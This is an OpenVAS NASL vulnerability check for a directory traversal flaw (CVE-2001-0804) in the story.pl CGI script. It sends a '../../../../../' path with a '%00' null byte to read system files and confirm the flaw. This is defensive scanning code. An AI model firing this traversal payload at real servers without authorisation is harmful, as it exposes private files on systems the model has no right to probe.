###################################################################
# OpenVAS Vulnerability Test
# $Id: story.nasl 13543 2019-02-08 14:43:51Z cfischer $
#
# Interactive Story Directory Traversal Vulnerability
#
# Authors:
# Georges Dagousset <georges.dagousset@alert4web.com>
#
# Copyright:
# Copyright (C) 2001 Alert4Web.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.10817");
  script_version("$Revision: 13543 $");
  script_tag(name:"last_modification", value:"$Date: 2019-02-08 15:43:51 +0100 (Fri, 08 Feb 2019) $");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_bugtraq_id(3028);
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_cve_id("CVE-2001-0804");
  script_name("Interactive Story Directory Traversal Vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("This script is Copyright (C) 2001 Alert4Web.com");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "http_version.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"solution", value:"Upgrade story.pl to the latest version (1.4 or later).");
  script_tag(name:"summary", value:"It is possible to read arbitrary files on
  the remote server.");
  script_tag(name:"impact", value:"An attacker may use this flaw to read arbitrary files on
  this server.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("host_details.inc");
include("misc_func.inc");
include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port( default:80 );

files = traversal_files("linux");

foreach dir( make_list_unique( "/", "/story", cgi_dirs( port:port ) ) ) {

  if( dir == "/" ) dir = "";

  foreach file( keys( files ) ) {

    url = dir + "/story.pl?next=../../../../../" + files[file] + "%00";
    req = http_get( item:url, port:port );
    buf = http_keepalive_send_recv( port:port, data:req );

    if( egrep( pattern:"^HTTP/.* 404 .*", string:buf ) ) break;

    if( egrep( pattern:file, string:buf ) ) {
      report = report_vuln_url( port:port, url:url );
      security_message( port:port, data:report );
      exit( 0 );
    }
  }

  if( egrep( pattern:"^HTTP/.* 404 .*", string:buf ) ) continue;

  url = dir + "/story.pl?next=about";
  req = http_get( item:url, port:port );
  buf = http_keepalive_send_recv( port:port, data:req );

  if( egrep( pattern:"This is version 1\.[0-3] of the story program", string:buf ) ) {
    report = report_vuln_url( port:port, url:url );
    security_message( port:port, data:report );
    exit(0);
  }
}

exit( 99 );